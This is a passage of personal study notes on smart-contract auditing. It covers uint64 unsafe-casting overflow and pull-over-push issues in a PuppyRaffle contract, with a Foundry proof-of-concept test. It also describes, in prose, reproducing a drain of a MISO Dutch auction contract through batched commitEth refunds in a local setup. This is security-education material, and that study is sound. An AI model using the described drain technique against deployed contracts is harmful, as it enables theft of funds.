So as long as the totalamountcollected is greater than 2 wei which is an insignificant value in monetary terms, then this calculation should always work. 2 wei for prize pool because 2\*80 = 160 which is bigger than 100 so the 160/100 division will return 2.6 which will round down to 1 as solidity doesnt consider decimals but for a number so low, precision loss is irrelevant so there is no need to bring this up. It is just something to advice the protocol about that is possible.

The more important one is the totalFees calculation. Looking at the code, totalfees was declared as a uint64 and the fee variable is casted to a uint64 to add it to the totalfees. Just from looking at it, uint256 has a much larger max value than uint64 so if the fee value is higher than the max uint64 value, this could cause an issue. This is known as unsafe casting and when you see anything like this, it should be ringing alarm bells in your head.

Also you can see an addition occurs to add totalfees to fee. You should be thinking about an overflow instantly and this is super easy to spot. I have written poc's for the unsafe casting and the overflow below. These should be very easy to grasp. To fix this, you can convert totalfees to a uint256 or upgrade the solidity version.

<details>

<summary>Code</summary>

```javascript
 function test_cancauseoverflowinfeevariable() public {
        address[] memory players = new address[](100);
        for (uint i = 0; i < 100; i++) {
            players[i] = address(uint160(i));
        }
        console.log(players.length);

        vm.deal(user1, 1000 ether);
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        uint256 totalfees = puppyRaffle.totalFees();
        assertEq(totalfees, 20 ether);
    }

```

</details>

Problem here is that a user has entered the lottery with 100 addresses and the selectwinner function has been called. the entrancefee is set at 1 ether so 100 addresses should be 100 ether. So the totalfees at this point should be 20% of this which is 20 ether which is what this test is trying to assert. this will fail because of the unsafe casting from uint256 to uint64. the fee of 20 ether is larger than the max uint64 so once this value reaches the max uint64 which is 18.446744073709551615 Ether, it starts counting again from 0 which is why the value returned from the above test is 1.553255926290448384 Ether which is not the 20 ether we expect and this is a massive bug as the fees expected by the protocol are reduced by almost 19 ether which is a lot of money. Underflow, overflow and unsafe casting are huge issues that you must look out for when auditing any code. The same issue will occur if totalfees + fee would be more than type(uint64).max and the above poc shows this as well.

# 9 PULL OVER PUSH

There is also another problem with the selectWinner function. Imagine a situation where a user enters the lottery with a smart contract and the smart contract doesnt have a receive function which means it cannot receive the ether so the low level call that transfers the ether to the winner address will revert. See the relevant code below:

```javascript
 (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

so the transaction will revert because success will return false. this means that the transaction will always revert and no one will be able to call select winner successfully. This can potentially end the raffle because the winner wont be able to be paid out. This is an issue because the winner wont be able to paid out which is an issue. Although it doesnt stop the raffle from running as more people can enter the lottery and a different winner will be picked when selectWinner is called but that means the original winner wont be able to get their payout which is definitely an issue.

Whenever you see a function that transfers eth to a contract, your first thought should be what happens if this transaction fails. This is where the pull over push theory will mitifgate this error. Pull over push means that the protocol creates a function where the winner can claim their winnings from the contract rather than sending the winnings directly to the address. I covered the pull over push theory in the full stack web3 development javascript pt 2 notes so you can have a look at that to read more.

## ERRORS FIXED

# 1 ERROR RELATING TO GAS SNAPSHOT (LEARNING POINT 2)

When trying to get the gas for each entrant in point 2 above, i tried to use vm.startSnapshotGas but I got the error below:

```bash

Error (9582): Member "startSnapshotGas" not found or not visible after argument-dependent lookup in contract Vm.
test/PuppyRaffleTest.t.sol:51:9: TypeError: Member "startSnapshotGas" not found or not visible after argument-dependent lookup in contract Vm.
vm.startSnapshotGas("externalA");
^-----------------^

```

this was strange because this function was in the foundry docs and i copied the example accurately so this error couldnt be due to me using the wrong argument length or type. so i decided to look in the vm.sol file in the forge-std directory to check if the function was there. the "startSnapshotGas" wasnt there which meant that in my setup, there was no "startSnapshotGas" function. this was strange as the function was in the docs so why isnt it here. after asking around, i was told to run the following code:

```bash

forge update lib/forge-std && forge build --force //if you dont use force, it will revert to previous version where startsnapshotgas isnt available. see discussion at https://github.com/foundry-rs/foundry/issues/2207

```

this updates the lib/forge-std to tthe latest version and you will see the "startSnapshotGas" in the vm.sol file after running this.

# 2 ERROR WHEN TESTING WITH PYTHON/BROWNIE (LEARNING POINT 5)

I want to discuss some issues I had when looking at the bitdao potential exploit in the miso directory which you can see in the securityresearchcyfrin directory. This
point relates to point 5 in the learning section. The issue was that since i set max commitment at 9.9 eth or whatever, when I ran the batch function with 10 calls to
the commiteth function, it worked perfectly because on the 10th call , the max commitment would be met. when i increased the calls array to 11 commiteth calls, what
I expected was that on the 11th call, the contract would see that the max commitment has been met and then will refund 'my' eth back to me. In reality it wont be my eth
it would be giving me. I would be receiving eth from the contract that I never sent to it as i only sent 1 eth with my batch call but once max commitment gets hit, the
contract refunds any eth over the max commitment value so the idea was to keep calling commiteth with my batch function so many times that the max commitment is hit and
then it starts refunding me eth from the contract that i never sent because remember that i only sent 1 eth to the contract in the batch function. This way, i can keep
calling commit eth with the batch function until there are no funds left in the contract.

the problem was that when i called commiteth in the batch function, on the iteration of commiteth where the 'refund' was supposed to happen, the revert in the receive
function of the dutch auction contract kept getting called. This was really weird because there was no eth being sent to the contract and I made sure of that. see the
code for the commiteth function below:

```javascript
 function commitEth(
        address payable _beneficiary,
        bool readAndAgreedToMarketParticipationAgreement
    ) public payable {
        require(
            paymentCurrency == ETH_ADDRESS,
            "DutchAuction: payment currency is not ETH address"
        );
        if (readAndAgreedToMarketParticipationAgreement == false) {
            revert("No agreement provided");
        }
        // Get ETH able to be committed
        uint256 ethToTransfer = calculateCommitment(msg.value);

        /// @notice Accept ETH Payments.
        uint256 ethToRefund = msg.value.sub(ethToTransfer);
        if (ethToTransfer > 0) {
            _addCommitment(_beneficiary, ethToTransfer);
        }

        /// @notice Return any ETH to be refunded.
        if (ethToRefund > 0) {
            _beneficiary.transfer(ethToRefund);
            _beneficiary.call{value: ethToRefund}("");
        }
    }

```

The logic that handles the refund was the transfer function so i just made sure that I didnt set \_beneficiary to the dutch auction contract address and when i made
sure that wasnt the case, i commented out the receive function from the dutch auction contract to see what would happen and the reentrancy guard from the committokens
function started showing up as an error which was completely unrelated as i never interacted with that function in any way so why would an error come from there?

I then checked to see if a normal call to commiteth would work after the maxcommittment had been hit and lo and behold, it worked and the eth was refunded to the account
that called the commiteth function. so i knew something was wrong with the transfer keyword. i figured that something was going wrong in the way
my test suite was interpreting the calls encoding. Maybe it didnt encode the \_beneficiary address in a way that was comaptible with the transfer keyword.

To confirm my assumption, i changed the transfer keyword to:

```javascript
 _beneficiary.call{value: ethToRefund}("");
```

which does the same thing the transfer function above does and with this, the batch function worked and funds from the dutch_auction contract were correctly sent to
my beneficiary contract. This was really bugging me though because i had to change the code to get the poc to work. I wanted to make sure this was a problem with the
test suite and not a solidity thing. so i went to remix, copied the contracts folder from my miso directory into remix and deployed all the contracts I needed and
ran the tests using the transfer keyword and as expected, the contract was also able to be drained which confirmed my suspicion that it was an issue with the test environment
and the way it was encoding my beneficiary contract address may have been incompatible with the transfer keyword in solidity.

this is also a note that when carrying out your audit tests, it is much easier and quicker to carry out the tests in remix. Your go to should be foundry as it is the
best one to carry out tests with but sometimes you might just want to write a poc quickly and run some quick checks on something and in such cases, remix is probably
your best bet. The only time you should use another framework for auditing is if one comes out that is more convenient. Using hardhat or brownie is a bit more difficult
as you can run into issues like the one I just outlined and errors are less verbose and harder to debug that using remix and foundry. you do have experience with hardhat
and brownie though should you ever need it which is why the python and hardhat coverage you did on youtube with patrick collins was so important. it is great that you have
that knowledge about all frameworks so you wont ever be out of place as you have extensive notes that cover all of them.
